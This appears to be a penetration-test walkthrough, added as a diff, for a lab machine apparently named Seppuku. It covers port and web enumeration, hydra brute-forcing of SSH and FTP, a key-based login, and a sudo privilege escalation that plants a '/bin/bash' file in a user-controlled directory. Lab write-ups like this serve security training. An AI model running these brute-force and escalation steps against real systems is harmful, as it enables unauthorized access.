@@ -1,0 +1,36 @@
+nmap -p- 192.168.56.113
+Open ports 21,22,80,139,445,7080,7601,8088
+Enumerate http 
+
+dirb http://192.168.56.113
+on different ports found usefull links
+
+http://192.168.56.113:7601/keys/
+192.168.56.113:7601/secret/
+
+enum4linux 192.168.56.113
+users: 
+seppuku
+samurai
+tanto
+smbmap -H 192.168.56.113 (no luck)
+nikto -url http://192.168.56.113 (no luck)
+
+Start bruteforce attack against 
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.113 ssh -t 4
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.113 ftp -t 4
+
+Start dictionry using password.list found in secret folder
+got password ssh&ftp password for seppuku user
+login with ftp (no luck)
+login ssh using private key with tanto user
+
+under seppuku user has hidden file having password for samurai user
+switch to samurai 
+it has sudo permission 
+
+creat directory mkdir /home/tanto/.cgi_bin
+cd /home/tanto/.cgi_bin
+echo "/bin/bash" > /home/tanto/.cgi_bin/bin
+execute bin by samurai user with sudo 
+(dont forget to check the permission)
